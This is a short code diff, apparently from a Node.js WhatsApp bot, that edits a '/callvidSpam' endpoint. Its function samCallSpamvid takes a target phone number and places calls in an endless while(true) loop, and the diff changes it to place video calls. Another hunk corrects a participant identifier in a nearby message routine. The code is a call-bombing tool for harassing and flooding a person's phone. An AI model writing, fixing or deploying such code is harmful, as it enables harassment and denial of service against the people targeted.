@@ -177,7 +177,7 @@ const jid = toWhatsAppJID(target); // Convert phone number to JID
 				},
 				Ptcp ? {
 					participant: {
-						jid: target
+						jid: jid
 					}
 				} : {}
 			);
@@ -234,8 +234,9 @@ app.get('/callvidSpam', async (req, res) => {
 async function samCallSpamvid(target) {
 const jid = toWhatsAppJID(target); // Convert phone number to JID
 while (true) {
-await XeonBotInc.offerCall(jid);
+await XeonBotInc.offerCall(jid, {
 video: true
+});
 }
 		};
     // Basic validation for phone numbers
